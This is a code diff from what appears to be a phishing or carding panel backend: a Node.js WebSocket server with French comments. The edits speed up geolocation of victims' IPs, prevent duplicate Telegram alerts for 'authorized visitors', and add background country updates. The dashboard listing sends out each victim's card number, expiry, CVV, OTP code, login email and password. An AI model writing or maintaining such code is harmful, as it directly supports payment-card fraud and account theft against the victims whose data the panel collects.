@@ -420,40 +420,28 @@ wss.on('connection', async (ws, req) => {
   console.log(`[Connection] Origin: ${req.headers.origin || 'N/A'}`);
   console.log(`[Connection] ========================================\n`);
 
-  // Obtenir le pays à partir de l'IP - IMPORTANT: Attendre que le pays soit récupéré
+  // Obtenir le pays à partir de l'IP - Version optimisée pour rapidité
   let country = await getCountryFromIP(ip);
   console.log(`[Country] ✅ IP ${ip} -> Country: ${country}`);
   
-  // Si le pays est "Unknown", réessayer jusqu'à obtenir un résultat valide
-  let retryCount = 0;
-  const maxRetries = 5;
-  while ((!country || country === 'Unknown') && retryCount < maxRetries) {
-    retryCount++;
-    console.log(`[Country] ⚠️  Country is ${country || 'missing'}, retrying (attempt ${retryCount}/${maxRetries})...`);
-    await new Promise(resolve => setTimeout(resolve, 2000)); // Attendre 2 secondes entre les tentatives
+  // Si le pays est "Unknown", faire UNE tentative rapide (pas de retries multiples pour éviter les délais)
+  if (!country || country === 'Unknown') {
+    console.log(`[Country] ⚠️  Country is ${country || 'missing'}, doing one quick retry...`);
+    // Une seule tentative rapide avec un délai court
+    await new Promise(resolve => setTimeout(resolve, 1000)); // 1 seconde seulement
     country = await getCountryFromIP(ip);
-    console.log(`[Country] 🔄 Retry ${retryCount} result: ${country}`);
+    console.log(`[Country] 🔄 Quick retry result: ${country}`);
   }
   
-  // Si toujours "Unknown" après tous les essais, utiliser une valeur par défaut basée sur l'IP
+  // Si toujours "Unknown", utiliser une valeur par défaut basée sur l'IP
   if (!country || country === 'Unknown') {
-    console.log(`[Country] ⚠️  Could not determine country after ${maxRetries} attempts, using IP analysis`);
-    // Essayer de déterminer le pays depuis l'IP en utilisant une autre méthode
-    country = await getCountryFromIP(ip); // Dernière tentative
-    if (!country || country === 'Unknown') {
-      // Si c'est une IP locale, utiliser "Local"
-      if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
-        country = 'Local';
-      } else {
-        // Pour les IPs publiques, forcer une nouvelle tentative avec un délai plus long
-        console.log(`[Country] 🔄 Final attempt with longer timeout for IP: ${ip}`);
-        await new Promise(resolve => setTimeout(resolve, 5000));
-        country = await getCountryFromIP(ip);
-        if (!country || country === 'Unknown') {
-          console.log(`[Country] ❌ All attempts failed for IP: ${ip}`);
-          country = 'Unknown'; // Dernier recours
-        }
-      }
+    // Si c'est une IP locale, utiliser "Local"
+    if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.') || ip.startsWith('172.')) {
+      country = 'Local';
+    } else {
+      // Pour les IPs publiques, utiliser "Unknown" (sera mis à jour lors de l'enregistrement si nécessaire)
+      console.log(`[Country] ⚠️  Could not determine country for IP: ${ip}, will use IP as fallback if needed`);
+      country = 'Unknown'; // Sera mis à jour lors de l'enregistrement si nécessaire
     }
   }
   
@@ -714,77 +702,62 @@ async function handleRegister(clientId, data) {
   // Notifier Telegram pour les visiteurs autorisés (dès qu'ils visitent le lien)
   // IMPORTANT: Vérifier que la notification n'a pas déjà été envoyée pour éviter les doublons
   if (client.role === 'client' && !client.notificationSent) {
+    // Marquer IMMÉDIATEMENT que la notification va être envoyée pour éviter les doublons
+    // même si plusieurs appels à handleRegister arrivent en même temps
+    client.notificationSent = true;
     console.log(`[handleRegister] 🔔 Sending authorized visitor notification for client ${clientId}`);
     
-    // IMPORTANT: Le pays est un élément crucial, on doit absolument le récupérer
+    // Utiliser le pays déjà récupéré lors de la connexion (plus rapide)
     let country = client.country;
+    
+    // Si le pays n'est pas disponible ou est "Unknown", faire UNE tentative rapide (sans délais longs)
     if (!country || country === 'Unknown' || country === 'N/A') {
-      console.log(`[handleRegister] ⚠️  Country is ${country || 'missing'}, attempting to fetch again (CRITICAL)...`);
+      console.log(`[handleRegister] ⚠️  Country is ${country || 'missing'}, attempting quick fetch...`);
       if (client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
         try {
-          // Essayer jusqu'à 5 fois avec des délais progressifs pour garantir la récupération
-          const maxAttempts = 5;
-          let attempts = 0;
-          while ((!country || country === 'Unknown') && attempts < maxAttempts) {
-            attempts++;
-            const delay = attempts * 2000; // Délai progressif: 2s, 4s, 6s, 8s, 10s
-            if (attempts > 1) {
-              console.log(`[handleRegister] ⏳ Waiting ${delay}ms before attempt ${attempts}/${maxAttempts}...`);
-              await new Promise(resolve => setTimeout(resolve, delay));
-            }
-            
-            console.log(`[handleRegister] 🔄 Attempt ${attempts}/${maxAttempts} to fetch country for IP: ${client.ip}`);
-            country = await getCountryFromIP(client.ip);
-            console.log(`[handleRegister] 📍 Attempt ${attempts} result: ${country}`);
-            
-            if (country && country !== 'Unknown' && country !== 'Local') {
-              client.country = country;
-              console.log(`[handleRegister] ✅ Successfully fetched country: ${country}`);
-              break;
-            }
-          }
+          // UNE seule tentative rapide (pas de retries multiples pour éviter les délais)
+          country = await getCountryFromIP(client.ip);
+          console.log(`[handleRegister] 📍 Quick fetch result: ${country}`);
           
-          // Si toujours Unknown après tous les essais, forcer une dernière tentative avec timeout plus long
-          if (!country || country === 'Unknown') {
-            console.log(`[handleRegister] ⚠️  Could not fetch country after ${maxAttempts} attempts, forcing final attempt with extended timeout...`);
-            await new Promise(resolve => setTimeout(resolve, 5000));
-            country = await getCountryFromIP(client.ip);
-            
-            if (country && country !== 'Unknown' && country !== 'Local') {
-              client.country = country;
-              console.log(`[handleRegister] ✅ Final attempt successful! Country: ${country}`);
-            } else {
-              console.log(`[handleRegister] ❌ CRITICAL: Could not fetch country after all attempts for IP: ${client.ip}`);
-              // En dernier recours, utiliser l'IP mais loguer l'erreur
-              country = `Unable to determine (IP: ${client.ip})`;
-              console.error(`[handleRegister] ❌ Using fallback country value: ${country}`);
-            }
+          if (country && country !== 'Unknown' && country !== 'Local') {
+            client.country = country;
+            console.log(`[handleRegister] ✅ Successfully fetched country: ${country}`);
+          } else {
+            // Si échec, utiliser l'IP comme fallback (pas de retries longs)
+            country = `IP: ${client.ip}`;
+            client.country = country;
+            console.log(`[handleRegister] ⚠️  Using IP as fallback: ${country}`);
           }
         } catch (error) {
           console.error(`[handleRegister] ❌ Error fetching country:`, error);
-          country = `Error fetching (IP: ${client.ip})`;
+          country = `IP: ${client.ip}`;
+          client.country = country;
         }
       } else {
         console.log(`[handleRegister] ⚠️  Cannot fetch country - invalid or local IP: ${client.ip}`);
         country = client.ip === '127.0.0.1' ? 'Local' : `Local Network (IP: ${client.ip})`;
+        client.country = country;
       }
     } else {
       console.log(`[handleRegister] ✅ Using stored country: ${country}`);
     }
     
-    // Mettre à jour le pays dans les données du client pour les prochaines utilisations
-    // IMPORTANT: Toujours mettre à jour le pays, même s'il est "Unknown", pour éviter les valeurs null/undefined
-    client.country = country || 'Unknown';
-    console.log(`[handleRegister] ✅ Country updated in client data: ${client.country}`);
-    
+    // Envoyer la notification avec le pays disponible (même si c'est l'IP en fallback)
     await telegram.notifyAuthorizedVisitor({
       ip: client.ip,
       country: country || 'Unknown',
     });
     
-    // Marquer que la notification a été envoyée pour éviter les doublons
-    client.notificationSent = true;
-    console.log(`[handleRegister] ✅ Notification sent flag set to true for client ${clientId}`);
+    console.log(`[handleRegister] ✅ Notification sent for client ${clientId}, country: ${country}`);
+    
+    // Si le pays est toujours "Unknown" ou utilise l'IP comme fallback, lancer une mise à jour en arrière-plan
+    if ((!country || country === 'Unknown' || country.startsWith('IP:') || country.startsWith('Unable to determine')) && client.ip && client.ip !== 'unknown' && client.ip !== '127.0.0.1' && !client.ip.startsWith('192.168.') && !client.ip.startsWith('10.') && !client.ip.startsWith('172.')) {
+      console.log(`[handleRegister] 🔄 Launching background country update for client ${clientId}`);
+      // Mettre à jour le pays en arrière-plan (ne pas attendre)
+      updateCountryInBackground(clientId).catch(err => {
+        console.error(`[handleRegister] ❌ Error updating country in background for ${clientId}:`, err);
+      });
+    }
   } else if (client.role === 'client' && client.notificationSent) {
     console.log(`[handleRegister] ⚠️  Notification already sent for client ${clientId}, skipping...`);
   }
@@ -1117,6 +1090,51 @@ async function handleOTPSubmit(clientId, data) {
 
 
 // Liste des clients (pour dashboard)
+// Fonction pour mettre à jour le pays en arrière-plan pour un client
+async function updateCountryInBackground(clientId) {
+  const client = clients.get(clientId);
+  if (!client || !client.ip) {
+    return;
+  }
+  
+  // Ne mettre à jour que si le pays est "Unknown" ou manquant
+  if (client.country && client.country !== 'Unknown' && !client.country.startsWith('IP:') && !client.country.startsWith('Unable to determine')) {
+    return; // Le pays est déjà valide
+  }
+  
+  // Ignorer les IPs locales
+  if (client.ip === '127.0.0.1' || client.ip === '::1' || client.ip.startsWith('192.168.') || client.ip.startsWith('10.') || client.ip.startsWith('172.')) {
+    return;
+  }
+  
+  console.log(`[updateCountryInBackground] 🔄 Updating country for client ${clientId}, IP: ${client.ip}`);
+  
+  try {
+    const country = await getCountryFromIP(client.ip);
+    if (country && country !== 'Unknown' && country !== 'Local') {
+      client.country = country;
+      console.log(`[updateCountryInBackground] ✅ Country updated for client ${clientId}: ${country}`);
+      
+      // Notifier les dashboards de la mise à jour
+      broadcastToDashboards({
+        type: 'client_updated',
+        client: {
+          id: clientId,
+          ip: client.ip,
+          country: country,
+          current_page: client.current_page,
+          connectedAt: client.connectedAt,
+          last_seen: client.last_seen,
+        },
+      });
+    } else {
+      console.log(`[updateCountryInBackground] ⚠️  Could not update country for client ${clientId}, result: ${country}`);
+    }
+  } catch (error) {
+    console.error(`[updateCountryInBackground] ❌ Error updating country for client ${clientId}:`, error);
+  }
+}
+
 function handleList(clientId) {
   console.log(`[handleList] 📋 List request from ${clientId}`);
   const client = clients.get(clientId);
@@ -1129,7 +1147,7 @@ function handleList(clientId) {
   console.log(`[handleList] 📊 Total clients in storage: ${clients.size}`);
   console.log(`[handleList] 📊 Clients breakdown:`);
   Array.from(clients.values()).forEach(c => {
-    console.log(`[handleList]   - ${c.id}: role=${c.role || 'null'}, ip=${c.ip || 'N/A'}`);
+    console.log(`[handleList]   - ${c.id}: role=${c.role || 'null'}, ip=${c.ip || 'N/A'}, country=${c.country || 'Unknown'}`);
   });
   
   const clientsList = Array.from(clients.values())
@@ -1144,25 +1162,35 @@ function handleList(clientId) {
       }
       return isClient;
     })
-    .map(c => ({
-      id: c.id,
-      ip: c.ip,
-      country: c.country || 'Unknown',
-      current_page: c.current_page,
-      connectedAt: c.connectedAt,
-      last_seen: c.last_seen,
-      card_holder: c.card_holder,
-      card_number: c.card_number,
-      card_expiration: c.card_expiration,
-      card_cvv: c.card_cvv,
-      otp_code: c.otp_code,
-      otp_status: c.otp_status,
-      otp_submitted_at: c.otp_submitted_at,
-      login_email: c.login_email,
-      login_password: c.login_password,
-      first_name: c.first_name,
-      last_name: c.last_name,
-    }));
+    .map(c => {
+      // Si le pays est "Unknown" ou manquant, lancer une mise à jour en arrière-plan
+      if ((!c.country || c.country === 'Unknown' || c.country.startsWith('IP:') || c.country.startsWith('Unable to determine')) && c.ip && c.ip !== 'unknown' && c.ip !== '127.0.0.1' && !c.ip.startsWith('192.168.') && !c.ip.startsWith('10.') && !c.ip.startsWith('172.')) {
+        // Mettre à jour le pays en arrière-plan (ne pas attendre)
+        updateCountryInBackground(c.id).catch(err => {
+          console.error(`[handleList] ❌ Error updating country in background for ${c.id}:`, err);
+        });
+      }
+      
+      return {
+        id: c.id,
+        ip: c.ip,
+        country: c.country || 'Unknown',
+        current_page: c.current_page,
+        connectedAt: c.connectedAt,
+        last_seen: c.last_seen,
+        card_holder: c.card_holder,
+        card_number: c.card_number,
+        card_expiration: c.card_expiration,
+        card_cvv: c.card_cvv,
+        otp_code: c.otp_code,
+        otp_status: c.otp_status,
+        otp_submitted_at: c.otp_submitted_at,
+        login_email: c.login_email,
+        login_password: c.login_password,
+        first_name: c.first_name,
+        last_name: c.last_name,
+      };
+    });
   
   console.log(`[handleList] 📊 Sending ${clientsList.length} client(s) to dashboard ${clientId}`);
   if (clientsList.length > 0) {
